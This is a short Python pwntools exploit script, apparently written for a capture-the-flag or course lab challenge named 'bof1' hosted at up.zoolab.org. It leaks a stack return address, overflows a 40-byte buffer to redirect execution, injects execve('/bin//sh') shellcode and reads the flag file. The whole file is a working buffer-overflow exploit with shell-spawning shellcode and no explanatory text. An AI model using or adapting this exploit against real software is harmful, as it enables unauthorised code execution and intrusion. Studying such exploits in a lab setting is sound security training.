#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'

exe = './bof1'
port = 10258

elf = ELF(exe)
off_main = elf.symbols[b'main']
base = 0
qemu_base = 0

codes = """
  xor rax, rax
  push rax
  mov rbx, 0x68732f6e69622f2f
  push rbx
  mov rdi, rsp
  mov rsi, 0
  mov rdx, 0
  mov rax, 59
  syscall
"""

payload = asm(codes)
# print(payload)

r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
elif 'qemu' in sys.argv[1:]:
    qemu_base = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('up.zoolab.org', port)

pause()


r.recvuntil(b'name?')

r.send(b'A'*40)
ret = r.recvline().split(b'A'*40)[1][:-1].ljust(8,b'\x00')
r.send(b'A')

nret = p64(u64(ret)+0xca6fc)
r.recvuntil(b'name?')
r.send(b'A'*40 + nret)

r.recvuntil(b'message: ')
r.send(payload)
r.send(b'cat FLAG\n')
r.recvline()
print(r.recvline())

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :